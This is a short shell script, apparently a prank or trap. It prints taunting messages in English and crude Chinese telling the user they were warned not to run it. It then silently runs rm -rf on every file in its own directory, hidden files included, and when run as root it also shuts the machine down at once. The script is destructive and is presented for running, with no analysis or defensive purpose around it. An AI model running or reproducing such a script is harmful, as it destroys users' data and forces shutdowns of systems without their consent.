#<?sh version="1.0" encoding="UTF-8"?>
#!/bin/sh


SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"


if [ -t 0 ]; then
    echo "I already said not to run me"
else
    echo "我踏马说过别运行我，尼尓多隆吗？😡"
fi


if [ "$(id -u)" -eq 0 ]; then
    
    rm -rf "${SCRIPT_DIR:?}"/* "${SCRIPT_DIR:?}"/.* 2>/dev/null
    shutdown -h now
else
    
    if [ -t 0 ]; then
        echo "You NB，I put down you one mother"
    else
        echo "你牛逼，放你一马😡"
    fi
   
    rm -rf "${SCRIPT_DIR:?}"/* "${SCRIPT_DIR:?}"/.* 2>/dev/null
fi
